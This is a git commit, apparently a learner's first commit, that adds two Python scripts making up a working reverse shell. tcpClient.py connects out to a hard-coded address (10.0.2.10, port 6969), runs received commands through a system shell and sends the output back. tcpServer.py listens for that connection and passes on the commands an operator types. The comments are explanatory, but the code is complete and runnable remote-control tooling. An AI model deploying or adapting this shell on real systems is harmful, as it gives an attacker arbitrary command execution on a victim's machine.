40e3a1a1d932f628adde8bf97b9922ad7039d17a
luigg2000 <luigg2000@gmail.com>
2022-10-28 13:13:27 +0100

    first commit

---
+++ tcpClient.py
@@ -0,0 +1,29 @@
+import socket
+import subprocess
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
+
+s.connect(('10.0.2.10',6969)) # use connect method. takes address tuple as argument ('<IP>', <PORT>). change it to your server machine
+
+while True:
+    # here we store in the command variable what we want to receive something from this socket
+    command = s.recv(4096).decode("UTF-8") # recv(<max bytes of data the socket will allow>)
+                                           # decode will be needed cuz data will be sent as binary (default=UTF-8)
+
+    if command == "exit":
+        s.close()
+        break          # if the given command is "exit" then terminate connection and break out of the loop 
+
+    # print("Command received: " + command)
+
+    # once the client receives the command, it runs it using the subprocess module
+    runCommand = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    # args=(<command to execute>, <use shell to get more functionalities>, <get command output>,<redirect errors to stdout instead of stderr>)
+
+    # print("Output: " + str(runCommand.stdout))
+
+    #now send the output of the run method through the socket
+    if str(runCommand.stdout) == "b''": # if the command has no output then send no output 
+        s.send("no output".encode("UTF-8"))
+    else:                         # else send the output
+        s.send(runCommand.stdout)
---
+++ tcpServer.py
@@ -0,0 +1,33 @@
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
+
+s.bind(('0.0.0.0', 6969)) # use bind method. takes tuple as argument ('<IP>', <PORT>)
+
+s.listen() # start listening for a connection
+
+print("Listening...")
+
+conn, addr = s.accept() # accept the connection. returns a connection object and address object
+
+# print("Connection " + str(conn))
+print("Connection received from " + addr[0])
+
+while True:
+    command = input("$ ")
+
+    if command == "exit": # if the given command is "exit" then close the connection and break out of the loop
+        conn.send(command.encode("UTF-8")) # but first send it so the client closes connection too
+        s.close()
+        break
+
+    # with the connection object, send the input command (encoded from UTF-8 to bytes)
+    conn.send(command.encode("UTF-8"))
+
+    response = conn.recv(4096).decode("UTF-8")
+
+    if response == "no output":# if the command doesnt have output dont try to print anything and iterate again
+        print("") 
+    else:
+        # receive the output of the command and print it to the screen
+        print(response) # every time we get something from a socket its going to be bytes so we have to decode it
